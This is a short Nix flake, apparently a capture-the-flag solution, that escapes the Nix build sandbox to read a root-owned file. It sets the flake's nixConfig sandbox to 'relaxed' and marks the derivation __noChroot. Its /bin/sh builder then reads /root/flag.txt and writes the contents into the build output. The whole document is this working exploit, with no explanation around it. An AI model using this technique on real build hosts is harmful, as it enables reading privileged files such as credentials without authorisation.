{
  description = "Phoenix";

  nixConfig = {
    sandbox = "relaxed";
  };

  outputs = { self }: {
    packages.x86_64-linux.default =
      builtins.derivation {
        name = "flag";
        system = "x86_64-linux";

        __noChroot = true;

        builder = "/bin/sh";

        args = [
          "-c"
          ''
            IFS= read -r FLAG < /root/flag.txt
            printf '%s' "$FLAG" > "$out"
          ''
        ];
      };
  };
}